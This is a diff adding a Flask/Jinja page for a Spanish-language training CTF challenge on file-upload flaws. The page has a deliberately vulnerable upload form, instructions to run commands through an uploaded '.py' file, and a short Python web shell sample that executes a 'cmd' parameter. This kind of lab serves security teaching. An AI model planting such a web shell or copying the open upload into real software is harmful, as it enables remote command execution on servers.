@@ -1,0 +1,72 @@
+{% extends 'base.html' %}
+{% from '_macros.html' import challenge_header, briefing, hints, flag_form, detect_bar, nav_buttons %}
+{% block title %}Papá Oso Despierta — Goldilocks CTF{% endblock %}
+
+{% block content %}
+<div class="wrap narrow">
+  {{ challenge_header(ch) }}
+  <p class="lead">"Papá Oso abre un ojo… La ventana de la galería deja pasar cualquier cosa."</p>
+
+  {{ detect_bar(g_detection) }}
+  {{ briefing(ch) }}
+
+  <div class="card glow-red">
+    <div class="card-title">📤 Galería de fotos del bosque <span style="font-size:0.75rem;color:var(--text-faint);">(nivel {{ level }})</span></div>
+    <form method="POST" action="{{ url_for('challenge_webshell') }}" enctype="multipart/form-data">
+      <div class="drop" onclick="document.getElementById('f').click()">
+        <div style="font-size:1.8rem;">🗂️</div>
+        <div class="fn">Haz clic para elegir un archivo</div>
+        <div style="font-size:0.8rem;color:var(--text-faint);margin-top:0.3rem;">
+          {{ 'Acepta cualquier tipo de archivo' if level == 'low' else 'Solo imágenes (.png .jpg .gif)' }}
+        </div>
+      </div>
+      <input type="file" id="f" name="file" style="display:none"
+             onchange="document.querySelector('.drop .fn').textContent=this.files[0].name">
+      <button class="btn btn-cyan" type="submit" style="margin-top:0.8rem;">Subir por la ventana</button>
+    </form>
+
+    {% if upload_result == 'ok' %}
+      <div class="alert alert-success" style="margin-top:1rem;">
+        Archivo subido: <code>{{ upload_filename }}</code>
+      </div>
+      <div class="flag-box" style="color:#b9f2c9;">{{ upload_url }}</div>
+      <p style="font-size:0.85rem;color:var(--text-dim);">
+        Si es <code>.py</code>, añade <code>?cmd=COMANDO</code> para ejecutar comandos.
+      </p>
+    {% elif upload_result %}
+      <div class="alert alert-danger" style="margin-top:1rem;">{{ upload_result }}</div>
+    {% endif %}
+
+    <div class="code-block" style="margin-top:1rem;"># shell.py
+import subprocess
+from flask import request
+def run():
+    return subprocess.getoutput(request.args.get('cmd', 'id'))</div>
+  </div>
+
+  {% if file_list %}
+  <div class="card">
+    <div class="card-title">📁 Archivos en el servidor</div>
+    <div class="tbl-wrap">
+      <table>
+        <thead><tr><th>Nombre</th><th>Tamaño</th><th></th></tr></thead>
+        <tbody>
+          {% for f in file_list %}
+          <tr>
+            <td><code>{{ f.name }}</code></td>
+            <td>{{ f.size }}</td>
+            <td><a href="{{ f.url }}" target="_blank">Abrir ↗</a></td>
+          </tr>
+          {% endfor %}
+        </tbody>
+      </table>
+    </div>
+  </div>
+  {% endif %}
+
+  {{ hints(ch, hint_cost_min, hint_cost_pts) }}
+  {{ flag_form(ch, g_solved) }}
+
+  {{ nav_buttons(ch) }}
+</div>
+{% endblock %}
